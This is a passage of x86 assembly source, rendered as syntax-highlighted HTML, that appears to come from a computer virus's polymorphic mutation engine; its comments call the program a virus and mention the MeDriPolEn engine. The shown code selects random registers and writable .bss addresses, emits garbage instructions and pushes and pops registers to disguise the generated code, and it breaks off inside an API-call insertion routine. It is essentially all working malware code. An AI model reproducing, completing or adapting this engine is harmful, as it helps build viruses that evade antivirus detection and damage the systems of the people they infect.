                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@PureValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@WithoutAddition</span><span class="sc0">
       </span><span class="sc5">@@WithAddition</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@WA_byte</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@WA_byte</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@OK2</span><span class="sc0">
     </span><span class="sc5">@@WA_byte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@ValueToAdd</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@OK2</span><span class="sc0">

     </span><span class="sc5">@@WithoutAddition</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@WithAddition</span><span class="sc0">
         </span><span class="sc5">@@OK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosw</span><span class="sc0">
         </span><span class="sc5">@@OK2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPOPReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseVar</span><span class="sc0">
            </span><span class="sc1">;    jmp   @@Return</span><span class="sc0">

     </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@@PureValue</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@@ValueToAdd</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">MakeCALLTo</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">ReserveReg</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
          </span><span class="sc5">@@OtherRandom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OtherRandom</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@AnyReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">@@AnyReg</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPUSHReg</span><span class="sc0">
      </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ReserveReg</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">ReleaseReg</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPOPReg</span><span class="sc0">
      </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ReleaseReg</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; This function selects a readable/writable memory address that can be used</span><span class="sc0">
</span><span class="sc1">;; for memory operations without causing any exception. It will get any</span><span class="sc0">
</span><span class="sc1">;; address from five frames that are prepared from the beginning. In this</span><span class="sc0">
</span><span class="sc1">;; virus there are five frames, but in another maybe there is one or two, so</span><span class="sc0">
</span><span class="sc1">;; we simply would put the same frames in the different variables.</span><span class="sc0">
</span><span class="sc1">;; I use here the .bss section (as a normal application does), and since the</span><span class="sc0">
</span><span class="sc1">;; section of the virus is theorically a data section, then some data frames</span><span class="sc0">
</span><span class="sc1">;; that the virus sets with its values while executing, not needing what was</span><span class="sc0">
</span><span class="sc1">;; there (that idea was made in MeDriPolEn, but now I pulished it).</span><span class="sc0">
</span><span class="sc5">SelectAnAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc5">@@Again</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">  </span><span class="sc1">; Get a data frame from 0 to 4</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Again</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">BssSection</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the address of that</span><span class="sc0">
                                                    </span><span class="sc1">; frame</span><span class="sc0">

  </span><span class="sc1">; I think a normal .bss section has 256 bytes at least! (and the others I'm</span><span class="sc0">
  </span><span class="sc1">; sure they have them)</span><span class="sc0">
      </span><span class="sc5">@@Again2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SelectLowAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LowAddress</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Ch</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Again2</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Done</span><span class="sc0">
       </span><span class="sc5">@@LowAddress</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Ch</span><span class="sc0">                
       </span><span class="sc5">@@Done</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Now we have a random address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReservedBssAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; See if it's</span><span class="sc0">
                                  </span><span class="sc1">; equal to the reserved one</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Again</span><span class="sc0">     </span><span class="sc1">; If it's equal (what a casuality!) then</span><span class="sc0">
                                  </span><span class="sc1">; select another</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc5">@@Loop_01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ReservedMemVars_Addr</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Again</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">@@Loop_01</span><span class="sc0">

      </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">SelectAnAddress</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SelectAnAddressLow</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SelectLowAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SelectAnAddress</span><span class="sc0">
</span><span class="sc5">SelectAnAddressLow</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SelectAnAddressHigh</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SelectLowAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SelectAnAddress</span><span class="sc0">
</span><span class="sc5">SelectAnAddressHigh</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SelectLowAddress</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; This function gets a random register (random number between 0 and 7) and</span><span class="sc0">
</span><span class="sc1">;; keep on getting it until that number doesn't coincide with any reserved</span><span class="sc0">
</span><span class="sc1">;; register identificator, nor with ESP, nor with the selected in the last</span><span class="sc0">
</span><span class="sc1">;; call to this function or similar.</span><span class="sc0">
</span><span class="sc5">SelectARegister</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">   </span><span class="sc1">; Random between 0 and 7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">; ESP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">SelectARegister</span><span class="sc0"> </span><span class="sc1">; Then, repeat</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Equal to Index1?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">SelectARegister</span><span class="sc0">                   </span><span class="sc1">; Then, repeat</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Equal to Index2?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">SelectARegister</span><span class="sc0">                   </span><span class="sc1">; Then, repeat</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Equal to Key?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">SelectARegister</span><span class="sc0">                   </span><span class="sc1">; Then, repeat</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Equal to Buffer?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">SelectARegister</span><span class="sc0">                   </span><span class="sc1">; Then, repeat</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegisterSelectedB4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; If it's equal</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">SelectARegister</span><span class="sc0">    </span><span class="sc1">; to the last selected one, repeat</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegisterSelectedB4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; Save as the</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                           </span><span class="sc1">; last selected, and return</span><span class="sc0">
</span><span class="sc5">SelectARegister</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function does the same as the function above but with a 8 bits regis-</span><span class="sc0">
</span><span class="sc1">;; ter, so it can only select E?X registers. Since there are four reserved</span><span class="sc0">
</span><span class="sc1">;; registers and only four composed registers (E?X), maybe this registers are</span><span class="sc0">
</span><span class="sc1">;; all reserved, so we check it before, returning the value 8 if no 8 bits re-</span><span class="sc0">
</span><span class="sc1">;; gister can be selected. Also we initialize the register if the selected one</span><span class="sc0">
</span><span class="sc1">;; hasn't been "touched" before, since we only use 8 bits registers to make</span><span class="sc0">
</span><span class="sc1">;; garbage.</span><span class="sc0">
</span><span class="sc5">SelectAReg8</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; E?X?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@NoProblemo</span><span class="sc0">                       </span><span class="sc1">; If, not, continue</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; E?X?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@NoProblemo</span><span class="sc0">                       </span><span class="sc1">; If, not, continue</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">; E?X?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@NoProblemo</span><span class="sc0">                       </span><span class="sc1">; If, not, continue</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; E?X?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@NoProblemo</span><span class="sc0">                       </span><span class="sc1">; If, not, continue</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">; Since all reserved are E?X, we can't conti-</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">              </span><span class="sc1">; nue</span><span class="sc0">
    </span><span class="sc5">@@NoProblemo</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">; Get a E?X register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Is it reserved?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoProblemo</span><span class="sc0">                        </span><span class="sc1">; If not, continue</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Is it reserved?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoProblemo</span><span class="sc0">                        </span><span class="sc1">; If not, continue</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Is it reserved?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoProblemo</span><span class="sc0">                        </span><span class="sc1">; If not, continue</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Is it reserved?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoProblemo</span><span class="sc0">                     </span><span class="sc1">; If not, continue</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; Look if the register is "touched"</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OK</span><span class="sc0">              </span><span class="sc1">; If it is, jump and continue</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; Save registers</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; DL=Selected 32 bits register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">      </span><span class="sc1">; Set a random value</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">  </span><span class="sc1">; Make a MOV (or similar) with the reg and the</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; value, and restore the registers from stack</span><span class="sc0">
     </span><span class="sc5">@@OK</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">  </span><span class="sc1">; Select random ?L or ?H</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">SelectAReg8</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; API calling thingies</span><span class="sc0">
</span><span class="sc5">InsertAPICall</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImInAPI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@End2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AnyAPIFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@End2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ImInAPI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
